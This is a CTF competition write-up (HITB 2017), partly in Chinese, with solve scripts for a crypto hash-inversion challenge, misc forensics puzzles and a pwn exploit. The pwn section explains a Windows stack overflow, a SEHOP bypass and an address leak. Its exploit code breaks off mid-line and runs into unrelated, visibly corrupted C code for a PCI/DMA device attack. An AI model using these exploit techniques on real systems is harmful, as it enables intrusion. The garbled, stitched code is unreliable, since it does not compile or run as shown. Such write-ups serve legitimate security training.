HITB Write Up
CTYPTO
HASHINATOR
python脚本:
#! /usr/bin/env python3 
# -*- coding: utf-8 -*- 
import re 
import os 
import hashlib 
import struct 
import time 
from base64 import b64encode 
from pwn import * 
context.log_level = "debug" 
def md5(bytestring): 
    return hashlib.md5(bytestring).digest() 
def sha(bytestring): 
    return hashlib.sha1(bytestring).digest() 
def blake(bytestring): 
    return hashlib.blake2b(bytestring).digest() 
def scrypt(bytestring): 
    l = int(len(bytestring) / 2) 
    salt = bytestring[:l] 
    p = bytestring[l:] 
    return hashlib.scrypt(p, salt=salt, n=2**16, r=8, p=1, 
maxmem=67111936) 
def xor(s1, s2): 
    return b''.join([bytes([s1[i] ^ s2[i % len(s2)]]) for i in range(len(s
1))]) 
def generate_password(): 
    return os.urandom(64) 
def generate_salt(p): 
    msize = 128 # f-you hashcat :D 
    salt_size = msize - len(p) 
    return os.urandom(salt_size) 
def generate_rounds(): 
    hashes = [md5, sha, blake, scrypt] 
    rand = struct.unpack("Q", os.urandom(8))[0] 
    rounds = [] 
    for i in range(32): 
        rounds.append(hashes[rand % len(hashes)]) 
        rand = rand >> 2 
    return rounds 
def calculate_hash(payload, hash_rounds): 
    interim_salt = payload[:64] 
    interim_hash = payload[64:] 
    for i in range(len(hash_rounds)): 
        interim_salt = xor(interim_salt, hash_rounds[-1-i](interim_hash)) 
        interim_hash = xor(interim_hash, hash_rounds[i](interim_salt)) 
    final_hash = interim_salt + interim_hash 
    return final_hash 
def generate_delay(self): 
    rand = struct.unpack("I", os.urandom(4))[0] 
    time.sleep(rand / 1000000000.0) 
def test(): 
    password = generate_password() 
    print("password: %s"%password) 
    salt = generate_salt(password) 
    print("salt: %s"%salt) 
    hash_rounds = generate_rounds() 
    password_hash = calculate_hash(salt + password, hash_rounds) 
    r_pass = restore(password_hash, hash_rounds) 
    print(r_pass == password)    
def restore(password_hash, hash_rounds): 
    salt = password_hash[:64] 
    ihash = password_hash[64:] 
    for i in range(32): 
        ihash = xor(ihash, hash_rounds[-1-i](salt)) 
        salt = xor(salt, hash_rounds[i](ihash)) 
    print("restore data: %s"%(salt+ihash)) 
    return ihash 
def attack(): 
    p = remote("47.88.216.38", 20013) 
    p.readuntil(" b'") 
    base = p.readuntil("'")[:-1] 
    base = base64.b64decode(base) 
    assert len(base) == 128 
    salt = base[:64] 
    ihash = base[64:] 
    p.readuntil("used:\n") 
    hash_round = [] 
    for x in range(32): 
        tmp = p.readline() 
        if b"scrypt" in tmp: 
            hash_round.append(scrypt) 
        elif b"sha" in tmp: 
            hash_round.append(sha) 
        elif b"md5" in tmp: 
            hash_round.append(md5) 
        elif b"blake" in tmp: 
            hash_round.append(blake) 
    assert len(hash_round) == 32 
    ihash = restore(base, hash_round) 
    ihash = re.findall(b"([a-zA-Z0-9]+)", ihash)[-1]     
    p.sendline(ihash) 
    p.interactive() 
if __name__ == '__main__': 
    # test() 
    attack() 
MISC
Flying_High
题目提供了4个 bin 文件，于是先 ﬁle 一下发现是UBIfs image，于是挂载。可以辨认出是一个
ARDrone的文件系统镜像。最后在 image3.bin 中的/video/usb/下找到了一段录制的视频
video_20170817_150007.mov。视频中就是 ﬂag。
2017, Dating in Singapore
简单观察发现题目所给数字两两一组都在1-31之间，结合题目想到日历，用类似键盘密码的形式解
密即可。
table = [[1,8,15,22,29,15,16,17,3,10,17,24,31],[5,6,7,13,20,27,16,27,28],
[1,2,3,2,9,16,23,30],[2,9,16,23,2,3,10,9,9,10,17,24,23],
[2,1,8,14,22,29,30],[6,5,4,11,18,25,26,27],[2,3,4,3,10,17,24,31],
[1,2,3,1,8,15,22,29,15,16,17],[4,5,6,4,11,18,25,18,19,20],
[1,8,15,22,29,30,31,24,17,10,3],[26,19,12,5,20,28,21,14,7],[4,5,12,13,19,2
6,25]] 
pad = [-1,2,2,5,0,3,5,1,4,-1,2,4] 
for i in table: 
    res = [0]*49 
    for j in i: 
        res[j+pad[table.index(i)]]=1 
    for j in range(len(res)): 
        if j%7 == 0: 
            print 
        print 'X' if res[j] else '.', 
    print 
    print 
Cephalopod
tcpxtract 得到图片，内容就是ﬂag
PWN
BabyShellcode
This challenge is a simple shellcode manager, which allows us to upload shellcode and execute
on the server-side. (Though the shellcode execution functionality is blocked.)
In the script below we totally exploited two bugs in the binary. The ﬁrst one is an stack-based
buﬀer overﬂow vulnerability in handling username input : the program reads a large buﬀer into the
small name buﬀer. We used this bug as an info-leak to leak the SEH chain pointer since the
program does not add any trailing zero to the name string. With the leaked pointer we can bypass
SEHOP . The second one is also an stack-based buﬀer overﬂow in handling shellcode execution :
the program stores the shellcode being executed into a small stack-buﬀer without any length
check. We used this bug to gain code execution.
Moreover, there’s another point which causes module base address leakage : the program uses
WELL1024a  as its PRNG to generate challenge when a user tries to disable shellcode-guard. The
initial seed of the PRNG is the function address of scmgr!init_scmgr . So we did a little brute-
force to ﬁnd the module base. Luckily scmgr.dll  is compiled without SafeSEH  protection, so
any address inside this image is a valid target.
Exploit :
import socket 
import telnetlib 
import struct 
#ADDR = ('localhost', 9999) 
ADDR = ('47.88.217.238', 20003) 
s = socket.create_connection(ADDR) 
f = s.makefile('rw', 0) 
def read_until(delim='\n'): 
    buf = '' 
    while not buf.endswith(delim): 
        buf += f.read(1) 
    return buf 
def p32(x): 
    return struct.pack(" 
#include  
#include  
#include  
#include  
#include  
#include  
#include  
#include  
void __attribute__((noreturn)) fatal(char* str) 
{ 
    //perror(str); 
    exit(-1); 
} 
uint64_t vtop(uint64_t vaddr) { 
    intptr_t paddr; 
    off_t off; 
    uint64_t e; 
    paddr = 0; 
    off = (vaddr / 0x1000) * sizeof(uint64_t); 
    // https://www.kernel.org/doc/Documentation/vm/pagemap.txt 
    int fd = open("/proc/self/pagemap", O_RDONLY); 
    if(fd = 0) { 
                if (e & (1ULL = length)   break; 
    } 
    return; 
} 
#define PCI_DEV1_PORT_BASE 0xc000 
#define PCI_DEV2_PORT_BASE 0xc100 
void* devmmio; 
void mwrite4(uint32_t offset, uint32_t value) { 
    *(uint32_t*)((char*)devmmio + offset) = value; 
} 
void dma_set_src_low(uint32_t value) { 
    mwrite4(128, value); 
} 
void dma_set_src_hi(uint32_t value) { 
    mwrite4(132, value); 
} 
void dma_set_dst_low(uint32_t value) { 
    mwrite4(136, value); 
} 
void dma_set_dst_hi(uint32_t value) { 
    mwrite4(140, value); 
} 
void dma_set_cnt(uint32_t value) { 
    mwrite4(144, value); 
} 
void dma_set_cmd(uint32_t value) { 
    mwrite4(152, value | 1); 
} 
#define DMA_WRITE 2 
#define DMA_READ 0 
#define DMA_ENCRYPT 4 
int main(int argc, char* argv[], char* envp[]) 
{ 
    uint8_t* dma_mem = malloc(0x1000); 
    int fd = open("/sys/bus/pci/devices/0000:00:04.0/resource0", O_RDWR); 
    if(fd < 0) { fatal("open"); } 
    void* mem = mmap(NULL, 0x100000, PROT_READ|PROT_WRITE, MAP_SHARED, fd,
 0); 
    if(mem == (void*)-1) { fatal("mmap"); } 